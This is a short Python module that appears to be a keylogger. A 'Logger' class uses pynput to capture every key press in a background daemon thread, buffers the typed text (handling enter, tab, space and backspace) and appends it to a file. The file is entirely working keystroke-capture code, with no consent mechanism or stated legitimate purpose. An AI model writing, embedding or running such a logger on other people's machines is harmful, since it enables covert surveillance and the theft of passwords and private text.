import threading
from pynput import keyboard


class Logger:
    def __init__(self, with_onrelease=True):
        self.with_onrelease=with_onrelease
        self.text = ""
        self.stop_flag = False
        self.start_listener()


    def get_text_out(self):
        captured_text=self.text
        self.text=""
        return captured_text

    def write_to_file(self,filename):
        try:
            with open(filename,'a') as file_obj:
                file_obj.write(self.get_text_out())
            res=True
        except:
            res=False
        finally:
            return res

    def on_press(self, key):

        if key == keyboard.Key.enter:
            self.text += "\n"
        elif key == keyboard.Key.tab:
            self.text += "\t"
        elif key == keyboard.Key.space:
            self.text += " "
        elif key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
            pass
        elif key == keyboard.Key.backspace and len(self.text) == 0:
            pass
        elif key == keyboard.Key.backspace and len(self.text) > 0:
            self.text = self.text[:-1]
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            pass
        else:
            self.text += str(key).strip("'")

    @staticmethod
    def on_release(key):
        print(f'{key} released')
        if key == keyboard.Key.esc:
            # Stop listener
            return False

    def start_listener(self):
        listener_thread = threading.Thread(target=self._listener_loop)
        listener_thread.daemon = True
        listener_thread.start()

    def _listener_loop(self):
        if self.with_onrelease:  # default method
            with keyboard.Listener(
                    on_press=self.on_press,
                    on_release=self.on_release) as listener:
                listener.join()

        else:
            with keyboard.Listener(
                    on_press=self.on_press) as listener:
                listener.join()
